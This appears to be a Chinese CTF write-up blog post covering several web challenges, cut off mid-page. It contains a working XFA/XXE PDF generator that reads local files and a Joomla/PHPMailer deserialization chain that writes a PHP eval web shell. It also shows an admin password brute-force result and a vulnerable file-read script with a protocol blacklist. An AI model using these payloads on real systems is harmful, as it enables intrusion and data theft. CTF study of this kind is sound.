+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pypdf <span class="keyword">import</span> PdfWriter</span><br><span class="line"><span class="keyword">from</span> pypdf.generic <span class="keyword">import</span> NameObject, DecodedStreamObject, DictionaryObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_pdf</span>():</span><br><span class="line">    current_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    output_path = os.path.join(current_dir, <span class="string">&quot;xfa_test_final.pdf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    writer = PdfWriter()</span><br><span class="line">    writer.add_blank_page(width=<span class="number">612</span>, height=<span class="number">792</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造包含 XXE Payload 的 XDP 结构</span></span><br><span class="line">    xfa_content = <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:datasets xmlns:xfa=&quot;http://www.xfa.org/schema/xfa-data/1.0/&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;xfa:data&gt;</span></span><br><span class="line"><span class="string">            &lt;root&gt;</span></span><br><span class="line"><span class="string">                &lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">                    &lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span></span><br><span class="line"><span class="string">                ]&gt;</span></span><br><span class="line"><span class="string">                &lt;data&gt;&amp;file;&lt;/data&gt;</span></span><br><span class="line"><span class="string">            &lt;/root&gt;</span></span><br><span class="line"><span class="string">        &lt;/xfa:data&gt;</span></span><br><span class="line"><span class="string">    &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">&lt;/xdp:xdp&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 创建 XFA 流对象</span></span><br><span class="line">    payload_stream = DecodedStreamObject()</span><br><span class="line">    payload_stream._data = xfa_content.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 必须添加类型标识，否则某些阅读器不识别</span></span><br><span class="line">    payload_stream.update(&#123;</span><br><span class="line">        NameObject(<span class="string">&quot;/Type&quot;</span>): NameObject(<span class="string">&quot;/EmbeddedFile&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    xfa_ref = writer._add_object(payload_stream)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 构造 AcroForm 字典</span></span><br><span class="line">    <span class="comment"># 使用 DictionaryObject 包装以修复 AttributeError</span></span><br><span class="line">    acro_form = DictionaryObject()</span><br><span class="line">    acro_form.update(&#123;</span><br><span class="line">        NameObject(<span class="string">&quot;/XFA&quot;</span>): xfa_ref</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 注入到 PDF 根节点</span></span><br><span class="line">    writer.root_object.update(&#123;</span><br><span class="line">        NameObject(<span class="string">&quot;/AcroForm&quot;</span>): writer._add_object(acro_form),</span><br><span class="line">        NameObject(<span class="string">&quot;/NeedsRendering&quot;</span>): NameObject(<span class="string">&quot;/true&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            writer.write(f)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;--- 成功 ---&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件位置: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件大小: <span class="subst">&#123;os.path.getsize(output_path)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;写入失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_pdf()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Joomla-Revenge"><a href="#Joomla-Revenge" class="headerlink" title="Joomla Revenge!"></a>Joomla Revenge!</h1><p>这题考的自己挖掘链子 我自己挖掘的时候卡住() 在网上搜寻的时候发现和自己最后落脚点一样的链子</p>
+<p>找到了这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91387">https://xz.aliyun.com/news/91387</a></p>
+<p>大家可以参加这篇文章来追下链子</p>
+<p>我这就直接贴poc了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Database</span>\<span class="title class_">Sqlite</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">SqliteDriver</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">dispatcher</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>= [<span class="string">&#x27;driver&#x27;</span>=&gt;<span class="string">&#x27;MeteorKai&#x27;</span>];<span class="comment">//这里是host什么的都可以</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dispatcher</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;dispatcher = <span class="variable">$dispatcher</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Joomla</span>\<span class="title class_">Event</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">listeners</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$listeners</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;listeners = <span class="variable">$listeners</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PHPMailer</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">Mailer</span>=&#x27;<span class="title class_">qmail</span>&#x27;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sender</span>=<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Sendmail</span>=<span class="string">&#x27;tee /var/www/html/shell.php --&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CharSet</span> = <span class="string">&#x27;iso-8859-1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$Body</span>=<span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$From</span> = <span class="string">&#x27;MeteorKai@example.com&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$AllowEmpty</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cc</span> = [[<span class="string">&#x27;MeteorKai@qq.com&#x27;</span>,<span class="string">&#x27;MeteorKai&#x27;</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">phpmailer</span> = <span class="title class_">new</span> \<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>\<span class="title class_">PHPMailer</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Event\Dispatcher</span>([<span class="string">&#x27;onAfterDisconnect&#x27;</span> =&gt; [[<span class="variable">$phpmailer</span>,<span class="string">&#x27;send&#x27;</span>]]]);</span><br><span class="line">    <span class="variable">$driver</span> = <span class="keyword">new</span> <span class="title class_">\Joomla\Database\Sqlite\SqliteDriver</span>(<span class="variable">$dispatcher</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$driver</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="一鸣唱吧"><a href="#一鸣唱吧" class="headerlink" title="一鸣唱吧"></a>一鸣唱吧</h1><p>进去尝试admin弱密码爆破<img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260207160535295.png" alt="image-20260207160535295"></p>
+<p>爆破出来密码是admin888</p>
+<p>admin多了一个读取源码的功能</p>
+<p>可以读到download.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 引入数据库连接</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() === PHP_SESSION_NONE) &#123; <span class="title function_ invoke__">session_start</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;includes/header.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;div class=&#x27;container&#x27;&gt;&lt;p class=&#x27;error&#x27;&gt;请先登录会员系统！/ Access Denied&lt;/p&gt;&lt;/div&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;includes/footer.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;preview&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;preview&#x27;</span>] === <span class="string">&quot;true&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$format</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;format&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;format&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========================================</span></span><br><span class="line">    <span class="comment">// 安全过滤：协议黑名单检查</span></span><br><span class="line">    <span class="comment">// ========================================</span></span><br><span class="line">    <span class="variable">$dangerousProtocols</span> = [</span><br><span class="line">        <span class="string">&#x27;php://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;data://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phar://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;zip://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.zlib://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;compress.bzip2://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;zlib://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;glob://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;expect://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;input://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ftp://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ftps://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dict://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gopher://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tftp://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ldap://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ssh2.sftp://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ssh2.scp://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ssh2.tunnel://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rar://&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ogg://&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dangerousProtocols</span> <span class="keyword">as</span> <span class="variable">$protocol</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$format</span>, <span class="variable">$protocol</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&#x27;includes/header.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;container&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;error&#x27;&gt;⚠️ 安全警告：禁止使用该协议 &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$protocol</span>) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;系统检测到潜在的安全风险，已拦截此次请求。&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&#x27;includes/footer.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ========================================</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$full_path</span> = <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$is_viewing_source</span> = (<span class="title function_ invoke__">strpos</span>(<span class="variable">$format</span>, <span class="string">&#x27;file://&#x27;</span>) === <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_viewing_source</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/plain; charset=utf-8&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;includes/header.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;container&#x27;&gt;&lt;h2 class=&#x27;neon-text&#x27;&gt;🔧 管理员预览控制台&lt;/h2&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;message&#x27;&gt;正在尝试加载资源流: &lt;strong&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$full_path</span>) . <span class="string">&quot;&lt;/strong&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;background: #000; padding: 15px; border: 1px solid #333; font-family: monospace; color: #0f0; white-space: pre-wrap;&#x27;&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$handle</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$full_path</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$handle</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_viewing_source</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$content</span>; </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: 资源加载失败。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;可能的原因为：\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;1. 文件路径不存在\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;2. 权限不足 (Permission Denied)\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;3. 协议格式错误\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;System Error: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$is_viewing_source</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&lt;/div&gt;&quot;</span>; <span class="comment">// 关闭 console 和 container</span></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;includes/footer.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//普通会员文件下载</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$filepath</span>));</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$filepath</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;error&#x27;&gt;文件不存在或已被移除。&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;error&#x27;&gt;非法请求。&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin_panel</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$current_dir</span> = <span class="keyword">__DIR__</span>; </span><br><span class="line">    <span class="variable">$admin_panel</span> = <span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;admin-panel&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h3 class=&quot;neon-text&quot;&gt;🔧 管理员内部预览 (Dev Mode)&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;color: gray; font-size: 0.8em;&quot;&gt;当前 Web 根目录: <span class="subst">&#123;$current_dir&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;form method=&quot;get&quot; target=&quot;_blank&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;hidden&quot; name=&quot;preview&quot; value=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label&gt;Resource URI:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;format&quot; placeholder=&quot;例如: file://<span class="subst">&#123;$current_dir&#125;</span>/index.php&quot; style=&quot;width: 70%;&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;button type=&quot;submit&quot;&gt;加载资源&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h2 <span class="class"><span class="keyword">class</span>=&quot;<span class="title">neon</span>-<span class="title">text</span>&quot;&gt;🎵 一鸣曲库 (归档中心)&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;这里存放着系统归档文件。普通会员可根据文件名下载。&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 30<span class="title">px</span>; <span 